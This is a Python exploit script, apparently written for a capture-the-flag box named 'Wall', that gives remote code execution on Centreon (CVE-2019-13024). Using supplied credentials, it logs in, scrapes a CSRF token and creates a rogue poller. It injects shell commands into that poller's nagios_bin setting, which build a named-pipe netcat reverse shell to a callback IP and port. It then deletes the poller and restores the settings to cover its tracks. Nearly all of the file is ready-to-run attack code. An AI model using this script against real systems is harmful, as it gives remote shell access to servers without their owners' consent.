# Automated Exploit Code for Wall (Requires username and password)
# Some parts (Beautiful Soup Usage) based on examples found: https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/
# "Returns" a reverse  shell to the given ip and port
# 12/4/2019
# Frank Cerny

import sys
import json
import requests
from requests import post
from bs4 import BeautifulSoup

if len(sys.argv) < 6:
    print("Usage: <target IP> <username> <password> <callback ip> <callback port>")
    exit(0)

targetURI = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
callbackIp = sys.argv[4]
callbackPort = int(sys.argv[5])

pollerName = "Lamp"
DEBUG = 0

# in body of requests "action" = -a on cmdline, "object" = -o on cmdline
# helps to match cmdline commands to API commands

# Helper Methods --------------------------------------------------------------------------------

# Attempts to get an auth token
# Returns a tuple (status, authtoken)
# 	authToken will be a string
def getAuthToken(username, password):
    data = {"username":username, "password":password}
    params = {"action":"authenticate"}
    r = post(url="http://{}/centreon/api/index.php?".format(targetURI), data=data, params=params)
    if r.text == '"Bad credentials"':
    	print("Invalid Credentials")
    	return (0, "")
    else:
    	d = json.loads(r.text)
    	return (1, d["authToken"])

# Makes a post request to the API with a given body
# Returns a tuple (status, results)
def makePostRequest(body):
	status, authToken = getAuthToken(username, password)
	if status == 0:
		return (0, "")
	params = {"action":"action", "object":"centreon_clapi"}
	header = {"Content-Type":"application/json", "centreon-auth-token":authToken}
	r = post(url="http://{}/centreon/api/index.php?".format(targetURI), data=json.dumps(body), params=params, headers=header)
	return (1, json.loads(r.text))

# Calls the debug function that triggers our injected command
def triggerExploit(pollerNumber, sessionCookie, debug):
	# Call the debug function
	page = "http://{}/centreon/include/configuration/configGenerate/xml/generateFiles.php".format(targetURI)
	body = {"poller": pollerNumber,"debug": "true","generate": "true"}
	h = {"Cookie": sessionCookie}
	# Call the function that calls our stuff we inject (a tomorrow thing)
	r = post(url=page, data=body, headers=h)
	if debug == 1:
		print("DEBUG, response of trigger: {}".format(r.text))

# Sets the localhost value of a poller by name
def setLocalHost(value, pollerName):
	body = {"action":"setparam", "object":"INSTANCE", "values":"{};localhost;{};".format(pollerName, value)}
	status, results = makePostRequest(body)

# Exploit ---------------------------------------------------------------------------------------

# Set up site login
print("Authenticating with the site")
s = requests.session()
response = s.get("http://{}/centreon/index.php?".format(targetURI))
# Based on Askar's exploit, need to get CSRF token from the page (dynamically changes)
html_content = response.text
soup = BeautifulSoup(html_content, "html.parser")
# Grabs the 3rd <input> item on the page
csrfToken = soup.findAll('input')[3].get("value")

# Attempt to login to the site
data = {"useralias": username, "password": password, "submitLogin": "Connect", "centreon_token": csrfToken}
response = s.post(data=data, url="http://{}/centreon/index.php".format(targetURI))
# response = s.get("http://{}/centreon/main.php".format(targetURI))
sessionCookie = response.request.headers["Cookie"]

if response.text.find("Your credentials are incorrect.") > 0:
	print("Failed to login, check credentials")
	exit(0)

# We can only execute commands on a "Central Poller", and there can only ever be 1 central poller executed
# The following section toggles all pollers to non localhost, so we can execute the poller we create
# Then we reset the existing pollers back to their original value
body = {"action":"POLLERLIST"}
status, pollerList = makePostRequest(body)
if status == 0:
	print("Terminating...")
	exit(0)

# Array of poller dictionaries
l = pollerList["result"]

print("Toggling off localhost for all pollers")

# What a single datapoint looks like
# {'result': [{'id': '9', 'name': 'hello', 'localhost': '1', 'ip address': '127.0.0.1', 'activate': '1', 'status': '-', 'init script': 'centengine', 'bin': '/usr/sbin/centengine', 
# 'stats bin': '/usr/sbin/centenginestats', 'ssh port': '22'}]}

# Contains the names of the pollers that were originally local host
lhList = list()

for index, poller in enumerate(l):
	name = poller["name"]
	# Get poller details
	body = {"action":"show", "object":"INSTANCE", "values":"{}".format(name)}
	status, results = makePostRequest(body)
	p = results["result"][0]
	if p["localhost"] == "1":
		lhList.append(name)
		setLocalHost(0, name)

# Need to create our poller
print("Setting up poller")
body = {"action":"add", "object":"INSTANCE", "values":"{};127.0.0.1;22".format(pollerName)}
status, results = makePostRequest(body)
# Add engine configuration file (neccessary for execution)
body = {"action":"add", "object":"ENGINECFG", "values":"Configuration Engine for Fav Poller;{};This is but a small comment".format(pollerName)}
status, results = makePostRequest(body)
# Update where stats engine lives (based on example poller on centreon)
engine = "/usr/sbin/centenginestats"
body = {"action":"setparam", "object":"INSTANCE", "values":"{};nagiostats_bin;{};".format(pollerName, engine)}
status, results = makePostRequest(body)

# Update payload
payload = "mknod /tmp/backpipe p".format(callbackIp, callbackPort)
body = {"action":"setparam", "object":"INSTANCE", "values":"{};nagios_bin;{} #;".format(pollerName, payload)}
status, results = makePostRequest(body)

# Execute part 1 of the payload

# Get the poller id
body = {"action":"show", "object":"INSTANCE", "values":"{}".format(pollerName)}
status, results = makePostRequest(body)
pollerId = results["result"][0]["id"]

print("Executing part 1 of payload")
triggerExploit(pollerId, sessionCookie, DEBUG)

# Update poller and execute second part of poller
# Run the process is the background so we can delete our pollers while its running
payload = "/bin/sh 0</tmp/backpipe | nc {} {} 1>/tmp/backpipe &".format(callbackIp, callbackPort)
body = {"action":"setparam", "object":"INSTANCE", "values":"{};nagios_bin;{} #;".format(pollerName, payload)}
status, results = makePostRequest(body)

print("Executing part 2 of payload")
triggerExploit(pollerId, sessionCookie, DEBUG)

print("Check for reverse shell")
print("Deleting poller...")
body = {"action":"del", "object":"INSTANCE", "values":"{}".format(pollerName)}
status, results = makePostRequest(body)

print("Resetting pollers to localhost")

# Reset localhost value on existing pollers
for p in lhList:
	setLocalHost(1, p)

print("Exploit Complete. If failed, use debugging statements")
